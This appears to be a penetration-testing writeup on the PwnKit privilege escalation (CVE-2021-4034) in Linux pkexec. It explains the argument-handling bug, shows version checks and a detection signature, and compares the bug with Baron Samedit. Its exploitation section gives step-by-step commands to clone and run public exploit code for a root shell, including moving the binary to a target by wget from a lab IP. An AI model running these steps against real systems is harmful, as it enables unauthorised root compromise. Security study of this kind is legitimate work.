## Polkit / PwnKit (CVE-2021-4034)

PwnKit is a memory corruption vulnerability in `pkexec`, a SUID-root binary installed by default on every major Linux distribution. It allows any unprivileged local user to gain full root access without needing any sudo permissions or special group membership. 

***

## What Polkit and pkexec Are

Polkit is an inter-process communication authorisation service that mediates between privileged system components and unprivileged user processes.  The three tools it ships with are: 

- `pkexec` - runs a command as another user or root (like sudo, and the vulnerable component)
- `pkaction` - displays defined polkit actions
- `pkcheck` - checks if a process is authorised for a specific action

Configuration lives in two locations:

```
/usr/share/polkit-1/actions/    <- action/policy definitions
/usr/share/polkit-1/rules.d/    <- JavaScript-based rules
/etc/polkit-1/localauthority/50-local.d/*.pkla  <- local overrides
```

***

## The Vulnerability

`pkexec` does not properly validate the number of command-line arguments passed to it. When invoked with `argc = 0` (no arguments), it reads beyond the end of the `argv` array into memory that, due to Linux process memory layout, is actually the start of the `envp` (environment variables) array. 

An attacker crafts malicious environment variables such as `GCONV_PATH` to inject a path to a malicious shared object. Because pkexec is SUID-root, when it mistakenly treats that environment variable as a command argument and executes it, the attacker's code runs as root. 

The vulnerability has existed since `pkexec` was first introduced in May 2009 and was not discovered and patched until January 2022, making it over twelve years old. 

***

## Affected Scope

Every version of `pkexec` ever released before the January 2022 patch is affected. This includes all major distributions: Ubuntu, Debian, Fedora, CentOS, RHEL, Arch, and others. 

```bash
# Check pkexec version
pkexec --version

# Check polkit package version
dpkg -l policykit-1       # Debian/Ubuntu
rpm -qa | grep polkit     # RHEL/CentOS/Fedora

# Confirm pkexec is SUID root on the system
ls -la $(which pkexec)
# -rwsr-xr-x 1 root root ... /usr/bin/pkexec
```

***

## Exploitation

### Method 1: arthepsy PoC (Minimal, Single File)

```bash
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
./poc
# id
# uid=0(root) gid=0(root) groups=0(root)
```

### Method 2: ly4k Self-Contained PoC (No Dependencies)

This PoC bundles everything into a single binary and requires no external files: 

```bash
git clone https://github.com/ly4k/PwnKit.git
cd PwnKit
./PwnKit
# root shell drops immediately
```

### Method 3: Compile Offsite and Transfer

If the target has no internet access and no gcc, compile on a matching architecture machine and transfer:

```bash
# On your attack machine
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc

# Transfer to target
python3 -m http.server 8080

# On target
wget http://10.10.14.2:8080/poc
chmod +x poc
./poc
```

***

## Detection Signatures

Security tools detect PwnKit exploitation by watching for `pkexec` being called with an empty argument list and a crafted environment variable:

```
process: pkexec
args: (empty)
env contains: GCONV_PATH=
```

If you are operating on a monitored system, this pattern will generate a critical alert in SIEM tools. Defenders patch by updating the `policykit-1` or `polkit` package.

***

## Comparison with CVE-2021-3156 (Baron Samedit)

| | CVE-2021-4034 (PwnKit) | CVE-2021-3156 (Baron Samedit) |
|---|---|---|
| Vulnerable component | `pkexec` (polkit) | `sudo` |
| Root permissions required | None | None |
| Present since | 2009 (12+ years) | 2011 (10+ years) |
| CVSS score | 7.8 High  [picussecurity](https://www.picussecurity.com/resource/pwnkit-polkits-pkexec-cve-2021-4034-vulnerability-exploitation) | 7.8 High |
| Patch released | January 2022 | January 2021 |
| Exploit complexity | Low, single binary | Low, requires target-matched compile |
| Found by | Qualys Research Team | Qualys Research Team |

Both vulnerabilities were discovered by the same team, require no prior privileges whatsoever, and affect virtually every Linux system built over the previous decade. On any engagement where you land on a system with an unpatched polkit or sudo package, either of these is an immediate and reliable path to root.
